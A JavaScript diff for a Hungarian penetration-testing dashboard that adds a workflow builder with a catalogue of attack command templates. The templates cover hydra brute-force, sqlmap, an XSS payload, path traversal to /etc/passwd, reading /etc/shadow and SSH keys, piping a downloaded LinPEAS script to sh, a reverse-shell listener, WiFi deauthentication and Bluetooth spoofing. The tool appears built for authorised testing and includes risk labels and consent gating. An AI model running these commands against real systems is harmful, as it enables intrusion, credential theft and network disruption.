@@ -41,6 +41,7 @@ const GL={
   globe:'<circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a15 15 0 010 18M12 3a15 15 0 000 18"/>',
   phone:'<rect x="6" y="2" width="12" height="20" rx="2"/><path d="M10 18h4"/>',
   radio:'<circle cx="12" cy="12" r="2"/><path d="M7.8 7.8a6 6 0 000 8.4M16.2 7.8a6 6 0 010 8.4M5 5a10 10 0 000 14M19 5a10 10 0 010 14"/>',
+  pulse:'<path d="M3 12h3l2-7 4 14 3-9 2 2h4"/>',
 };
 const L=c=>`<span class="led ${c}"></span>`;
 const S=(c,t)=>`<span class="st ${c}">${c==='o'?'':L(c)}${t}</span>`;
@@ -103,6 +104,7 @@ const TREE=[
     {id:'wifite',label:'WiFi Audit',glyph:'wifi'},{id:'bt',label:'Bluetooth / BLE',glyph:'bt'},{id:'nmap',label:'Nmap Scan',glyph:'radar'},{id:'webapp',label:'Webapp',glyph:'globe'},{id:'android',label:'Android / mobil',glyph:'phone'},{id:'radio',label:'RFID / SDR',glyph:'radio'},{id:'pentest',label:'PenTest',glyph:'bug'}]},
   {folder:'Eredmények',glyph:'list',open:true,children:[
     {id:'handshakes',label:'Handshake-ek',glyph:'check'},{id:'findings',label:'Találatok',glyph:'search'}]},
+  {id:'monitor',label:'Monitorozás',glyph:'pulse'},
   {folder:'Védelem',glyph:'shield',open:true,children:[
     {id:'vedelem',label:'Védelmi eszközök',glyph:'shield'}]},
   {folder:'Dokumentáció',glyph:'book',open:true,children:[
@@ -112,9 +114,9 @@ const TREE=[
   {id:'update',label:'Frissítés',glyph:'dl'},
   {id:'settings',label:'Beállítások',glyph:'gear'},
 ];
-const TITLE={overview:'Áttekintés',wifite:'WiFi Audit',bt:'Bluetooth / BLE',nmap:'Nmap Scan',webapp:'Webapp',android:'Android / mobil',radio:'RFID / SDR',pentest:'PenTest',handshakes:'Handshake-ek',findings:'Találatok',vedelem:'Védelmi eszközök',kb:'Tudásbázis',naplo:'Napló',rendszer:'Rendszer-állapot',update:'Frissítés',settings:'Beállítások'};
-const PATH={overview:'Munkaterület',wifite:'Teszt / Audit',bt:'Teszt / Audit',nmap:'Teszt / Audit',webapp:'Teszt / Audit',android:'Teszt / Audit',radio:'Teszt / Audit',pentest:'Teszt / Audit',handshakes:'Eredmények',findings:'Eredmények',vedelem:'Védelem',kb:'Dokumentáció',naplo:'Dokumentáció',rendszer:'Rendszer',update:'Rendszer',settings:'Rendszer'};
-const GLYPH={overview:'grid',wifite:'wifi',bt:'bt',nmap:'radar',webapp:'globe',android:'phone',radio:'radio',pentest:'bug',handshakes:'check',findings:'search',vedelem:'shield',kb:'book',naplo:'note',rendszer:'chip',update:'dl',settings:'gear'};
+const TITLE={overview:'Áttekintés',wifite:'WiFi Audit',bt:'Bluetooth / BLE',nmap:'Nmap Scan',webapp:'Webapp',android:'Android / mobil',radio:'RFID / SDR',pentest:'PenTest',handshakes:'Handshake-ek',findings:'Találatok',monitor:'Monitorozás',vedelem:'Védelmi eszközök',kb:'Tudásbázis',naplo:'Napló',rendszer:'Rendszer-állapot',update:'Frissítés',settings:'Beállítások'};
+const PATH={overview:'Munkaterület',wifite:'Teszt / Audit',bt:'Teszt / Audit',nmap:'Teszt / Audit',webapp:'Teszt / Audit',android:'Teszt / Audit',radio:'Teszt / Audit',pentest:'Teszt / Audit',handshakes:'Eredmények',findings:'Eredmények',monitor:'Élő',vedelem:'Védelem',kb:'Dokumentáció',naplo:'Dokumentáció',rendszer:'Rendszer',update:'Rendszer',settings:'Rendszer'};
+const GLYPH={overview:'grid',wifite:'wifi',bt:'bt',nmap:'radar',webapp:'globe',android:'phone',radio:'radio',pentest:'bug',handshakes:'check',findings:'search',monitor:'pulse',vedelem:'shield',kb:'book',naplo:'note',rendszer:'chip',update:'dl',settings:'gear'};
 function buildTree(){
   const tl=$('#treeList');tl.innerHTML='';
   const node=(n,lvl)=>{const t=el('div','tnode lvl'+lvl);t.dataset.go=n.id;t.tabIndex=0;
@@ -460,7 +462,7 @@ VIEWS.webapp=()=>`
   <div class="scan-cat" style="padding:6px 2px 2px">Eszköz</div>
   <div id="waTools" class="scan-grid"><div class="dempty">Betöltés…</div></div>
   <div class="grow1">${consoleBox('webappOut','Webapp terminál','cél URL (https://… vagy host) — Enter futtat','waRun','Futtat','waStop',[{act:'waClear',g:'trash',label:'Törlés'}],'Válassz eszközt fent, írd a cél URL-t a parancssorba, majd Futtat/Enter. A kimenet itt folyik. sqlmap: csak engedélyezett célon!')}</div>`;
-MOUNT.webapp=()=>waToolsLoad();
+MOUNT.webapp=()=>{waToolsLoad();ptToolsFetch();};
 async function waToolsLoad(){try{WA.tools=await fetch('/api/webapp/tools').then(r=>r.json());}catch(e){WA.tools=[];}if(WA.tools.length&&!WA.tools.some(t=>t.key===WA.tool))WA.tool=WA.tools[0].key;waToolsRender();}
 function waToolsRender(){const c=$('#waTools');if(!c)return;c.innerHTML=WA.tools.length?WA.tools.map(t=>`<button class="scan-btn ${WA.tool===t.key?'on':''}" data-act="waPick" data-k="${esc(t.key)}"><span class="si">${t.installed?'●':'○'}</span><b>${esc(t.label)}</b><small>${t.installed?'telepítve':'nincs telepítve'}</small></button>`).join(''):'<div class="dempty">Nincs elérhető eszköz.</div>';}
 
@@ -479,7 +481,7 @@ VIEWS.android=()=>`
   </div>
   <div class="grow1"><div class="console"><div class="cons-hd">Android terminál<span class="ch-r"><span class="ttimer" id="androidOutTimer" style="display:none"></span><span class="tcount">0 sor</span><button class="cbtn" data-act="adbClear">${svg(GL.trash,2)}Törlés</button><input class="tfilter" data-tfilter="androidOut" placeholder="szűrés…"></span></div><div class="term" id="androidOut" tabindex="0"><div class="t-welcome">Válassz eszközt és műveletet. A kimenet itt folyik.</div></div></div></div>`;
 MOUNT.android=()=>{adbLoad();modStatusLoad();};
-async function adbLoad(){const s=$('#adbStatus');try{const d=await fetch('/api/android/devices').then(r=>r.json());AND.avail=!!d.available;AND.devices=d.devices||[];if(AND.devices.length&&!AND.devices.some(x=>x.serial===AND.serial))AND.serial=AND.devices[0].serial;if(s)s.textContent=d.available?(AND.devices.length?AND.devices.length+' eszköz':'nincs eszköz'):'adb nincs telepítve';adbDevsRender();if(!d.available){const dd=$('#adbDevs');if(dd)dd.innerHTML='<div class="dempty">'+esc(d.message||'Az adb nincs telepítve (platform-tools).')+'</div>';}}catch(e){if(s)s.textContent='—';}}
+async function adbLoad(){const s=$('#adbStatus');try{const d=await fetch('/api/android/devices').then(r=>r.json());AND.avail=!!d.available;AND.devices=d.devices||[];if(AND.devices.length&&!AND.devices.some(x=>x.serial===AND.serial))AND.serial=AND.devices[0].serial;if(s)s.textContent=d.available?(AND.devices.length?AND.devices.length+' eszköz':'nincs eszköz'):'adb nincs telepítve';adbDevsRender();if(curTool==='ctx')renderDrawer();if(!d.available){const dd=$('#adbDevs');if(dd)dd.innerHTML='<div class="dempty">'+esc(d.message||'Az adb nincs telepítve (platform-tools).')+'</div>';}}catch(e){if(s)s.textContent='—';}}
 function adbDevsRender(){const c=$('#adbDevs');if(!c)return;if(!AND.avail)return;c.innerHTML=AND.devices.length?AND.devices.map(x=>`<button class="scan-btn ${AND.serial===x.serial?'on':''}" data-act="adbPick" data-k="${esc(x.serial)}"><span class="si">${x.state==='device'?'●':'○'}</span><b>${esc(x.model||x.serial)}</b><small>${esc(x.serial)} · ${esc(x.state)}</small></button>`).join(''):'<div class="dempty">Nincs csatlakoztatott eszköz. Kösd USB-re és engedélyezd a hibakeresést.</div>';}
 
 /* ── RFID-NFC / SDR (rádió) ── */
@@ -506,6 +508,308 @@ VIEWS.pentest=()=>`
   </div>
   <div class="grow1">${consoleBox('ptOut','PenTest terminál — szabad parancs','parancs (pl. nmap -sV 10.0.0.1, nikto -h …) — Enter futtat','ptRunLine','Futtat','ptKill',[{act:'ptClear',g:'trash',label:'Törlés'}],'Írj be bármilyen parancsot és Enter — a backend terminálján fut, a kimenet élőben ide streamel. Szkriptet a fenti legördülőből, Kali-eszközt a jobb oldali „Bővítmények" panelből tölthetsz a parancssorba.')}</div>`;
 MOUNT.pentest=()=>{ptLoadScriptsSel();ptToolsFetch();};
+
+/* ═══════════ PenTest FOLYAMAT-ÉPÍTŐ (elágazó fa) ═══════════ */
+const PTT={
+  target:['Célpont','#e3b341'],ip:['IP-cím','#58a6ff'],host:['Élő host','#79c0ff'],
+  dns:['DNS-adat','#a5a5ff'],ports:['Portok','#36c2a6'],service:['Szolgáltatás','#3fb950'],
+  web:['Web','#f0883e'],path:['Útvonalak','#ffa657'],subdomain:['Aldomén','#d2a8ff'],
+  share:['SMB megoszt.','#ff9bce'],cred:['Hitelesítő','#f0583a'],vuln:['Sérülékenys.','#ff7b72'],
+  shell:['Hozzáférés','#ff5252'],loot:['Adat','#c9a227'],report:['Riport','#9aa4b2'],
+  wifiIface:['Monitor if','#36c2a6'],ap:['AP','#f0883e'],client:['Kliens','#79c0ff'],handshake:['Kézfogás','#d2a8ff'],
+  btIface:['BT adapter','#36c2a6'],btDev:['BT eszköz','#ff9bce'],btSvc:['BT szolg.','#3fb950'],
+  androidDev:['Android eszk.','#9fe1cb'],pkg:['Csomag','#d2a8ff'],apk:['APK','#ffa657'],monstream:['Élő stream','#58a6ff'],
+};
+const PTCAT={recon:'Felderítés',scan:'Szkennelés',enum:'Enumeráció',exploit:'Exploitáció',wifi:'WiFi',bt:'Bluetooth',android:'Android',post:'Post-exploit',report:'Riport'};
+const PTCATC={recon:'#58a6ff',scan:'#36c2a6',enum:'#d2a8ff',exploit:'#ff7b72',wifi:'#36c2a6',bt:'#ff9bce',android:'#9fe1cb',post:'#f0883e',report:'#9aa4b2'};
+/* kimenet-típus → /tmp/eth fájl: a lépések ide is írnak, a riportok innen olvasnak */
+const PTFILE={ip:'ip.txt',host:'host.txt',dns:'dns.txt',ports:'ports.txt',service:'service.txt',web:'web.txt',path:'paths.txt',subdomain:'subdomain.txt',share:'share.txt',cred:'creds.txt',vuln:'vuln.txt',loot:'loot.txt',handshake:'wifi/handshakes.txt',btDev:'bt/devices.txt',btSvc:'bt/services.txt',androidDev:'android/devices.txt',pkg:'android/packages.txt'};
+/* [cat, címke, leírás, parancs-sablon, [be], [ki]] */
+const PTLIB=[
+ ['recon','WHOIS','Domain-tulajdonos és regisztráció','whois <célpont>',['target'],['dns']],
+ ['recon','NSLookup','Domain → IP feloldás','nslookup <célpont>',['target'],['ip','dns']],
+ ['recon','DIG ANY','Összes DNS-rekord','dig <célpont> ANY',['target'],['dns']],
+ ['recon','DIG NS','Névszerverek','dig <célpont> NS',['target'],['dns']],
+ ['recon','DIG MX','Levelezőszerverek','dig <célpont> MX',['target'],['dns']],
+ ['recon','DIG TXT/SPF','TXT/SPF rekordok','dig <célpont> TXT',['target'],['dns']],
+ ['recon','theHarvester','E-mailek, aldomének OSINT','theHarvester -d <célpont> -b all',['target'],['subdomain','dns']],
+ ['recon','Ping','Elérhetőség ICMP-vel','ping -c 4 <célpont>',['target'],['host']],
+ ['recon','Traceroute','Útvonal a célig','traceroute <célpont>',['target'],['host']],
+ ['recon','Zone Transfer','DNS zóna-átvitel (AXFR)','dig axfr @$(dig <célpont> NS +short|head -1) <célpont>',['target','dns'],['subdomain','dns']],
+ ['recon','HTTP fejlécek','Szerver-fejlécek','curl -sI http://<célpont>',['target'],['web']],
+ ['recon','Robots.txt','Rejtett útvonalak','curl -s http://<célpont>/robots.txt',['target'],['path']],
+ ['scan','Nmap alap','Gyors verzió-scan','nmap -sV -T4 <célpont>',['target'],['ports','service']],
+ ['scan','Nmap teljes','Minden port + NSE','nmap -sV -sC -p- -T4 <célpont>',['target'],['ports','service']],
+ ['scan','Nmap UDP','Top 100 UDP port','nmap -sU --top-ports 100 <célpont>',['target'],['ports']],
+ ['scan','Nmap agresszív','OS, verzió, NSE','nmap -A -T4 <célpont>',['target'],['ports','service','vuln']],
+ ['scan','Nmap vuln','Sérülékenység NSE','nmap --script vuln --top-ports 50 <célpont>',['target','ports'],['vuln']],
+ ['scan','Nmap HTTP','HTTP cím/metódusok','nmap --script http-title,http-methods -p 80,443,8080 <célpont>',['target'],['web']],
+ ['scan','Nmap SMB vuln','SMB sérülékenységek','nmap --script smb-vuln* -p 139,445 <célpont>',['target'],['vuln']],
+ ['scan','Nmap SSL','SSL/TLS gyengeségek','nmap --script ssl-heartbleed,ssl-enum-ciphers -p 443 <célpont>',['target'],['vuln']],
+ ['scan','Masscan','Gyors teljes port-sweep','masscan <célpont> -p1-65535 --rate=1000',['target'],['ports']],
+ ['scan','Ping sweep','Élő hostok /24-ben','nmap -sn <célpont>/24',['target'],['host']],
+ ['scan','nc top portok','Gyakori portok netcattel','for p in 21 22 25 80 443 3306 8080; do nc -zv <célpont> $p 2>&1; done',['target'],['ports']],
+ ['enum','Gobuster dir','Könyvtár/fájl brute-force','gobuster dir -u http://<célpont> -w /usr/share/wordlists/dirb/common.txt -q',['web'],['path']],
+ ['enum','Nikto','Webszerver sebezhetőség-szkenner','nikto -h http://<célpont>',['web'],['vuln','path']],
+ ['enum','Dirb','Klasszikus könyvtár-brute','dirb http://<célpont>',['web'],['path']],
+ ['enum','FFUF subdomain','Aldomén fuzzing','ffuf -u http://FUZZ.<célpont> -w /usr/share/wordlists/subdomains.txt',['target'],['subdomain']],
+ ['enum','Enum4linux','SMB/Samba enumeráció','enum4linux -a <célpont>',['target'],['share','cred']],
+ ['enum','SMBclient lista','SMB megosztások','smbclient -L //<célpont>/ -N',['target'],['share']],
+ ['enum','SMBmap','SMB jogok','smbmap -H <célpont>',['target'],['share']],
+ ['enum','CrackMapExec','SMB/AD enumeráció','crackmapexec smb <célpont>',['target'],['share','cred']],
+ ['enum','SNMP walk','SNMP adatkinyerés','snmpwalk -c public -v1 <célpont>',['target'],['loot']],
+ ['enum','FTP anonymous','Névtelen FTP','curl -s ftp://<célpont>/ --user anonymous:anonymous',['target'],['loot']],
+ ['enum','SSH audit','SSH konfiguráció','ssh-audit <célpont>',['target','ports'],['vuln']],
+ ['exploit','SQLMap','SQLi kihasználás (GET)','sqlmap -u "http://<célpont>/page?id=1" --dbs --batch',['web','path'],['cred','loot']],
+ ['exploit','SQLMap POST','SQLi POST-on','sqlmap -u "http://<célpont>/login" --data="user=a&pass=b" --batch',['web'],['cred','loot']],
+ ['exploit','Hydra SSH','SSH jelszó brute-force','hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<célpont>',['target','ports'],['cred']],
+ ['exploit','Hydra HTTP','Webform brute-force','hydra -l admin -P rockyou.txt http-post-form://<célpont>/login:user=^USER^&pass=^PASS^:F=hiba',['web'],['cred']],
+ ['exploit','Searchsploit','Exploit keresése','searchsploit <célpont>',['service','vuln'],['vuln']],
+ ['exploit','XSS teszt','Reflektált XSS','curl -s "http://<célpont>/search?q=<script>alert(1)</script>"',['web','path'],['vuln']],
+ ['exploit','Path traversal','Könyvtár-bejárás','curl -s "http://<célpont>/file?path=../../../etc/passwd"',['web'],['loot']],
+ ['exploit','MSF portscan','Metasploit TCP scan','msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS <célpont>; run; exit"',['target'],['ports']],
+ ['exploit','Netcat listener','Reverse shell fogadása','nc -lvnp 4444',[],['shell']],
+ ['exploit','SSH login','Belépés hitelesítővel','ssh user@<célpont>',['cred'],['shell']],
+ ['post','Ki vagyok','Felhasználó/jogok','id && whoami',['shell'],['loot']],
+ ['post','Sudo jogok','sudo -l','sudo -l',['shell'],['loot']],
+ ['post','SUID fájlok','SUID binárisok','find / -perm -4000 2>/dev/null',['shell'],['loot']],
+ ['post','Crontab','Ütemezett feladatok','cat /etc/crontab && ls -la /etc/cron*',['shell'],['loot']],
+ ['post','Hálózat','Interfészek, portok','ip addr && ip route && ss -tulnp',['shell'],['loot']],
+ ['post','Passwd/Shadow','Jelszó-hash fájlok','cat /etc/passwd && cat /etc/shadow 2>/dev/null',['shell'],['cred']],
+ ['post','Futó folyamatok','ps aux','ps aux',['shell'],['loot']],
+ ['post','Kernel verzió','Kernel-exploit alap','uname -a && cat /etc/*-release',['shell'],['vuln']],
+ ['post','SSH kulcsok','Privát kulcsok','find / -name id_rsa -o -name authorized_keys 2>/dev/null',['shell'],['cred']],
+ ['post','Env változók','Környezeti titkok','env && cat ~/.bashrc ~/.profile 2>/dev/null',['shell'],['loot','cred']],
+ ['post','LinPEAS','Automata privesc','curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh|sh',['shell'],['vuln','loot']],
+ ['post','Írható könyvtárak','Writable mappák','find / -writable -type d 2>/dev/null | head -20',['shell'],['loot']],
+ ['report','Összefoglaló fejléc','Riport fejléc + dátum','mkdir -p /tmp/eth && echo "=== PENTEST ÖSSZEFOGLALÁS ===" && date',[],['report']],
+ ['report','Portok riport','Nyitott portok összegzése','echo "=== Nyitott portok ===" && cat /tmp/eth/ports.txt 2>/dev/null',['ports'],['report']],
+ ['report','Vuln riport','Sérülékenységek összegzése','echo "=== Sérülékenységek ===" && cat /tmp/eth/vuln.txt 2>/dev/null',['vuln'],['report']],
+ ['report','Loot riport','Begyűjtött adat összegzése','echo "=== Begyűjtött adat ===" && cat /tmp/eth/loot.txt 2>/dev/null',['loot','cred'],['report']],
+ ['report','Rendszer info','Alap rendszeradatok','uname -a && hostname && ip addr 2>/dev/null',['loot'],['report']],
+ ['report','Riport generálás','Részek összefűzése','echo "Cél: <célpont>" && echo "Dátum:" $(date) && echo "--- vége ---"',['report'],['report']],
+ ['wifi','Monitor mód be','Interfész monitor módba (wlan1)','sudo iw dev wlan1 set type monitor 2>/dev/null; sudo ip link set wlan1 up 2>/dev/null; iw dev wlan1 info 2>/dev/null | grep -i type || echo "monitor: wlan1"',[],['wifiIface']],
+ ['wifi','Hálózatok keresése','AP-k és kliensek (airodump)','sudo timeout 25 airodump-ng wlan1 2>&1 | head -40',['wifiIface'],['ap','client']],
+ ['wifi','Handshake elkapás','WPA kézfogás rögzítése','sudo timeout 60 airodump-ng -w /tmp/eth/wifi/hs --bssid <$BSSID> wlan1',['ap'],['handshake']],
+ ['wifi','Deauth','Kliens leválasztás (kézfogáshoz)','sudo aireplay-ng --deauth 5 -a <$BSSID> wlan1',['ap'],['handshake']],
+ ['wifi','PMKID (hcxdumptool)','PMKID elfogás kliens nélkül','sudo timeout 30 hcxdumptool -i wlan1 -o /tmp/eth/wifi/pmkid.pcapng --enable_status=1',['wifiIface'],['handshake']],
+ ['wifi','Jelszótörés','Kézfogás törése wordlisttel','aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/eth/wifi/*.cap 2>&1 | tail -20',['handshake'],['cred']],
+ ['wifi','WiFi riport','WiFi eredmények','echo "=== WiFi ===" && ls -la /tmp/eth/wifi/ 2>/dev/null',['handshake'],['report']],
+ ['bt','Adapter be','BT adapter bekapcsolása','bluetoothctl power on; echo "BT adapter: on"',[],['btIface']],
+ ['bt','Adapter infó','Adapter részletei','bluetoothctl show',['btIface'],['loot']],
+ ['bt','Klasszikus keresés','Közeli BT eszközök','(bluetoothctl --timeout 12 scan on >/dev/null 2>&1; bluetoothctl devices)',['btIface'],['btDev']],
+ ['bt','BLE keresés','BLE eszközök','(bluetoothctl --timeout 12 scan le >/dev/null 2>&1; bluetoothctl devices)',['btIface'],['btDev']],
+ ['bt','Rejtett eszközök','Nem látható BT (redfang)','sudo redfang -r 00:00:00:00:00:00-00:00:00:FF:FF:FF -s 2>&1 | head',['btIface'],['btDev']],
+ ['bt','Eszköz-infó','Kiválasztott eszköz infó','bluetoothctl info <$BTMAC>',['btDev'],['loot','btSvc']],
+ ['bt','SDP böngészés','Szolgáltatások (klasszikus)','sdptool browse <$BTMAC>',['btDev'],['btSvc']],
+ ['bt','BLE GATT szolgáltatások','GATT primary services','gatttool -b <$BTMAC> --primary',['btDev'],['btSvc']],
+ ['bt','Elérhetőség (RSSI)','l2ping élő/RSSI','sudo l2ping -c 5 <$BTMAC>',['btDev'],['loot']],
+ ['bt','L2CAP flood','L2CAP terhelés (intruzív)','sudo l2ping -f <$BTMAC>',['btDev'],['vuln']],
+ ['bt','OBEX pull','OBEX fájllista (obexftp)','obexftp -b <$BTMAC> -l',['btDev'],['loot']],
+ ['bt','Spoofing (spooftooph)','BT-cím hamisítás','sudo spooftooph -i hci0 -a <$BTMAC>',['btDev'],['loot']],
+ ['bt','BT riport','BT eredmények','echo "=== Bluetooth ===" && ls -la /tmp/eth/bt/ 2>/dev/null',[],['report']],
+ ['android','Eszközök listája','Csatlakoztatott ADB-eszközök','adb devices -l',[],['androidDev']],
+ ['android','WiFi-csatlakozás','ADB a hálózaton','adb connect <célpont>:5555',['target'],['androidDev']],
+ ['android','Eszköz-infó','Build, modell, patch-szint','adb -s <$SERIAL> shell getprop | head -40',['androidDev'],['loot']],
+ ['android','Hardver / akku','Akku, hő','adb -s <$SERIAL> shell dumpsys battery',['androidDev'],['loot']],
+ ['android','Hálózati config','IP, interfészek','adb -s <$SERIAL> shell ip addr',['androidDev'],['ip','loot']],
+ ['android','3rd-party appok','Nem gyári csomagok','adb -s <$SERIAL> shell pm list packages -3',['androidDev'],['pkg']],
+ ['android','Csomag + engedélyek','Permission-ök, részletek','adb -s <$SERIAL> shell dumpsys package <$PKG> | head -60',['pkg'],['loot','vuln']],
+ ['android','APK kihúzása','APK útvonal a telefonon','adb -s <$SERIAL> shell pm path <$PKG>',['pkg'],['apk']],
+ ['android','Nyitott portok (telefon)','Helyi szolgáltatások','adb -s <$SERIAL> shell cat /proc/net/tcp',['androidDev'],['ports']],
+ ['android','APK dekód (apktool)','Manifest + erőforrások','apktool d -f <$APK> -o /tmp/eth/android/apktool',['apk'],['loot','vuln']],
+ ['android','APK dekompilálás (jadx)','Java-forrás','jadx -d /tmp/eth/android/jadx <$APK>',['apk'],['loot','vuln']],
+ ['android','Manifest (aapt)','Badging, permission-ök','aapt dump badging <$APK>',['apk'],['loot','vuln']],
+ ['android','Root-jelek','su / build tags','adb -s <$SERIAL> shell "which su; getprop ro.build.tags"',['androidDev'],['vuln']],
+ ['android','SELinux állapot','Enforcing?','adb -s <$SERIAL> shell getenforce',['androidDev'],['loot']],
+ ['android','Logcat pillanatkép','Utolsó 500 sor','adb -s <$SERIAL> logcat -d -t 500',['androidDev'],['loot']],
+ ['android','SDCard böngészés','Fájllista','adb -s <$SERIAL> shell ls -la /sdcard',['androidDev'],['loot']],
+ ['android','Android riport','Android eredmények','echo "=== Android ===" && ls -la /tmp/eth/android/ 2>/dev/null',[],['report']],
+];
+const ptCat=i=>PTLIB[i][0],ptLabel=i=>PTLIB[i][1],ptDesc=i=>PTLIB[i][2],ptCmd=i=>PTLIB[i][3],ptIn=i=>PTLIB[i][4],ptOut=i=>PTLIB[i][5];
+
+/* modul-szűrés: a folyamat-építő minden modulban ott van, csak a domén-szűrt katalógussal */
+const FLOWSCOPE={wifite:'wifi',nmap:'net',webapp:'web',bt:'bt',android:'android',pentest:'pentest'};
+function flowScope(){return FLOWSCOPE[curView]||'pentest';}
+const PT_WEB=new Set(['HTTP fejlécek','Robots.txt','Nmap HTTP','Gobuster dir','Nikto','Dirb','FFUF subdomain','SQLMap','SQLMap POST','Hydra HTTP','XSS teszt','Path traversal']);
+function ptMod(i){const c=ptCat(i);if(c==='report'||c==='monitor')return ['*'];if(c==='post')return ['sys'];if(c==='wifi'||c==='bt'||c==='android')return [c];return PT_WEB.has(ptLabel(i))?['web']:['net'];}
+function ptInScope(i,sc){if(sc==='pentest')return true;const m=ptMod(i);return m.includes('*')||m.includes(sc);}
+/* kockázat-szintek (risk-gate, §10): a kategóriából származtatva */
+const PTRISKC={safe:'#3fb950',active:'#e3b341',intrusive:'#ff7b72',destructive:'#ff5252'};
+const PTRISKL={safe:'biztonságos',active:'aktív',intrusive:'intruzív',destructive:'destruktív'};
+const PT_INTRUSIVE=new Set(['Deauth','PMKID (hcxdumptool)','Jelszótörés','Rejtett eszközök','L2CAP flood','OBEX pull','Spoofing (spooftooph)']);
+function ptRisk(i){const c=ptCat(i);if(c==='exploit')return 'intrusive';if(PT_INTRUSIVE.has(ptLabel(i)))return 'intrusive';if(c==='recon'||c==='report')return 'safe';return 'active';}
+let PTCONSENT=false;
+let PTFLOWS={},PTFLOWSCOPE=null,PTFLOW={version:2,target:'',nodes:[]};
+function ptLoadScope(sc){if(PTFLOWSCOPE===sc)return;if(PTFLOWSCOPE)PTFLOWS[PTFLOWSCOPE]=PTFLOW;PTFLOWSCOPE=sc;PTFLOW=PTFLOWS[sc]||store.get('ptflow_cur_'+sc,{version:2,target:'',nodes:[]});PTFLOWS[sc]=PTFLOW;}
+let PTSAVED=store.get('ptflows',{});
+let PTFSEL=null,PTFVIA='target',PTFSEARCH='',PTFFILTER=true,PTFNAME='',_ptfId=1;
+function ptfNewId(){while(PTFLOW.nodes.some(n=>n.id==='n'+_ptfId))_ptfId++;return 'n'+(_ptfId++);}
+function ptNode(id){return PTFLOW.nodes.find(n=>n.id===id);}
+function ptRoots(){return PTFLOW.nodes.filter(n=>!n.parent);}
+function ptChildren(id){return PTFLOW.nodes.filter(n=>n.parent===id);}
+function ptAncestors(id){const a=[];let n=ptNode(id);while(n&&n.parent){n=ptNode(n.parent);if(n)a.push(n);}return a;}
+function ptAvail(id){const s=new Set(['target']);ptAncestors(id).forEach(n=>ptOut(n.lib).forEach(t=>s.add(t)));return s;}
+function ptAvailUnder(id){if(id==null)return new Set(['target']);const s=ptAvail(id);const n=ptNode(id);if(n)ptOut(n.lib).forEach(t=>s.add(t));return s;}
+function ptMissing(n){const av=ptAvail(n.id);return ptIn(n.lib).filter(t=>!av.has(t));}
+function ptConnectable(lib,id){const av=ptAvailUnder(id);return ptIn(lib).every(t=>av.has(t));}
+function ptOrder(){const out=[];const walk=n=>{out.push(n);ptChildren(n.id).forEach(walk);};ptRoots().forEach(walk);return out;}
+function ptLeafCount(){return PTFLOW.nodes.filter(n=>ptChildren(n.id).length===0).length;}
+function ptSave(){if(PTFLOWSCOPE){PTFLOWS[PTFLOWSCOPE]=PTFLOW;store.set('ptflow_cur_'+PTFLOWSCOPE,PTFLOW);}}
+function ptfAddNode(lib){const parent=PTFSEL,via=parent==null?'target':PTFVIA,id=ptfNewId();PTFLOW.nodes.push({id,lib,parent,via});PTFSEL=id;PTFVIA=(ptOut(lib)[0]||'target');ptSave();renderDrawer();}
+function ptLbl(t){return (PTT[t]||[t])[0];}
+function ptChipHtml(t){const c=(PTT[t]||[t,'#888'])[1];return `<span class="ptchip" style="--c:${c}">${esc(ptLbl(t))}</span>`;}
+function ptNodeHtml(n){const miss=ptMissing(n),leaf=ptChildren(n.id).length===0,sel=PTFSEL===n.id;
+  const cmd=esc(ptCmd(n.lib).replace(/<célpont>/g,PTFLOW.target||'<célpont>'));
+  return `<div class="ptnode ${sel?'sel':''} ${miss.length?'warn':''}" data-act="ptfSel" data-k="${n.id}">
+    <div class="ptnhead">${ORCH?`<span class="led ${orchLed(ORCH.status[n.id])}" title="${esc(ORCH.status[n.id]||'')}"></span>`:''}<span class="ptcat" style="--c:${PTCATC[ptCat(n.lib)]}">${esc(PTCAT[ptCat(n.lib)])}</span><b>${esc(ptLabel(n.lib))}</b>${ptRisk(n.lib)!=='safe'?`<span class="ptrisk" style="--c:${PTRISKC[ptRisk(n.lib)]}" title="kockázat">${PTRISKL[ptRisk(n.lib)]}</span>`:''}${leaf?'<span class="ptleaf">■ eredmény</span>':''}<span class="grow"></span><button class="ptx" data-act="ptfDel" data-k="${n.id}" title="Törlés">×</button></div>
+    <div class="ptcmd mono">${cmd}</div>
+    <div class="ptio">${ptIn(n.lib).map(ptChipHtml).join('')||'<span class="muted" style="font-size:10px">— nincs bemenet —</span>'}<span class="ptarrow">⟶</span>${ptOut(n.lib).map(ptChipHtml).join('')}</div>
+    ${miss.length?`<div class="ptmiss">⚠ hiányzó bemenet: ${miss.map(t=>esc(ptLbl(t))).join(', ')}</div>`:''}
+    ${(()=>{const tl=ptToolOf(n.lib);return (tl&&PT.tools&&PT.tools[tl]===false)?`<div class="ptmiss">⚙ hiányzó eszköz: <b>${esc(tl)}</b> <button class="addbr" data-act="ptfInstallTool" data-k="${esc(tl)}">${svg(GL.dl,2)} Telepítés</button></div>`:'';})()}
+    <div class="ptbranch-add">${ptOut(n.lib).map(o=>`<button class="addbr ${sel&&PTFVIA===o?'on':''}" data-act="ptfBranch" data-k="${n.id}" data-o="${o}">＋ ág ⇢ ${esc(ptLbl(o))}</button>`).join('')}</div>
+  </div>
+  <div class="branch">${ptChildren(n.id).map(c=>`<div class="via">⇢ ${esc(ptLbl(c.via))}</div>${ptNodeHtml(c)}`).join('')}</div>`;}
+function ptPaletteHtml(){const q=PTFSEARCH.toLowerCase();let out='';
+  Object.keys(PTCAT).forEach(cat=>{
+    const items=PTLIB.map((L,i)=>i).filter(i=>ptCat(i)===cat).filter(i=>ptInScope(i,flowScope()))
+      .filter(i=>!PTFFILTER||(ptConnectable(i,PTFSEL)&&(PTFVIA==='target'||ptIn(i).includes(PTFVIA))))
+      .filter(i=>!q||ptLabel(i).toLowerCase().includes(q)||ptDesc(i).toLowerCase().includes(q));
+    if(!items.length)return;
+    out+=`<div class="scan-cat" style="padding:6px 10px 2px">${esc(PTCAT[cat])}</div>`+items.map(i=>`<div class="hist ptpal" data-act="ptfAdd" data-k="${i}" style="cursor:pointer"><span class="ptdot" style="background:${PTRISKC[ptRisk(i)]}" title="${PTRISKL[ptRisk(i)]}"></span><span class="ptcat sm" style="--c:${PTCATC[cat]}">${esc(ptLabel(i))}</span><span class="ht muted" style="font-size:11px;flex:1">${esc(ptDesc(i))}</span><span class="ptaddio">${ptIn(i).map(ptChipHtml).join('')}</span></div>`).join('');
+  });
